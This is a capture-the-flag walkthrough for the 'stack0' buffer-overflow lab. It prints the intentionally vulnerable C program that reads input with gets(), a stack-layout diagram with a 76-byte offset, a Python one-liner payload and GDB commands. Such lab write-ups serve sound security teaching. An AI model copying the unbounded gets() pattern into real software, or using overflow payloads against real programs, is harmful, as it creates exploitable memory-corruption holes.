## `stack0` walkthrough (LiveOverflow / classic stack overwrite)

This challenge is the canonical “overwrite a local variable on the stack”.

Source (`stack.0.c`) is:

```1:18:/home/xubuntu/git/off-sec/liveoverflow-labs/0.stack/stack.0.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

## What you’re trying to do

- **Goal**: make `modified != 0` by overflowing `buffer` via `gets()`.
- **Why it works**: `gets()` does **no bounds checking**, so input longer than 64 bytes spills into adjacent stack locals.

## Stack layout (typical x86_64 build)

The exact offsets can vary by compiler/flags, so **verify with GDB**. For the build/layout shown by `stack.0.py`’s GDB batch, you’ll see a **76-byte** gap from `buffer` to `modified`.

```
              higher addresses
┌──────────────────────────────────────┐
│ saved RIP (return address)           │  [rbp+0x8]
├──────────────────────────────────────┤
│ saved RBP                            │  [rbp+0x0]
├──────────────────────────────────────┤
│ modified (4 bytes)                   │  [rbp-0x4 .. rbp-0x1]
├──────────────────────────────────────┤
│ padding/alignment                    │
├──────────────────────────────────────┤
│ buffer[64]                           │  [rbp-0x50 ..]
└──────────────────────────────────────┘
              lower addresses
```

### Offset you need (for this repo’s build)

\[
\text{offset} = 76\ \text{bytes}
\]

So a minimal payload is:

- `b"A"*76 + b"B"`

## Quick solve

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76+b"B"+b"\n")' | ./stack0
```

## GDB commands (plain)

```gdb
file ./stack0
break main
run
print &buffer
print &modified
print (char*)&modified - (char*)&buffer
```

## Automation

```bash
python3 stack.0.py
```
